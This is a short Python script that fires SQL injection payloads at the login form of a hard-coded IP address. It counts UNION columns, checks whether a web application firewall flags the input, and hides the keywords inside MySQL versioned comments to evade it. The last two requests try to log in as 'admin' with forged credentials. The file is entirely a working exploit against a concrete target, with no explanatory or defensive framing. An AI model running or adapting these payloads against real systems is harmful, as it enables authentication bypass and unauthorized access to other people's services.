import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"},
                       allow_redirects=False)
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:35}] status={r.status_code} loc={r.headers.get('Location')} waf={waf} len={len(r.text)}")

for n in range(1, 6):
    cols = ",".join(["'x'"] * n)
    payload = f"'/*!50000UNION*/ /*!50000SELECT*/ {cols}#"
    test(payload, f"union-{n}col-allx")

test("'/*!50000UNION*/ /*!50000SELECT*/ 1,'admin','x'#", "union-id-user-pass")
test("'/*!50000UNION*/ /*!50000SELECT*/ 'admin','x'#", "union-user-pass")
